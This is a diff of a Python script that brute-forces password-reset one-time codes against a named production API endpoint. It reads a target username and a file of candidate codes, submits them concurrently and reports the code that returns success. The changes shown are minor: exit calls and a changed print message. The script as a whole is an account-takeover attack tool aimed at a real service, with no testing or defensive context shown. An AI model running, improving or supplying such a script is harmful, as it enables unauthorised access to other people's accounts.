@@ -2,9 +2,9 @@ import concurrent.futures
 import requests
 import json
 
-
 # Define the endpoint URL
 url = "https://production.api.ezygo.app/api/v1/Xcr45_salt/password/reset"
+
 username=input("Enter the Username : ")
 otp_file=input("Otp File : ")
 print("Wait for few minutes !")
@@ -42,9 +42,10 @@ def send_request(otp):
     if response.status_code == 200:
         # Print the OTP if the request was successful
         print("OTP found: ", otp)
+        exit()
+        exit(0);
     else:
-        print("otp not match :" ,otp)
-        
+        print("not match: ", otp)
 
 # Open the file with the OTPs
 with open(otp_file) as f:
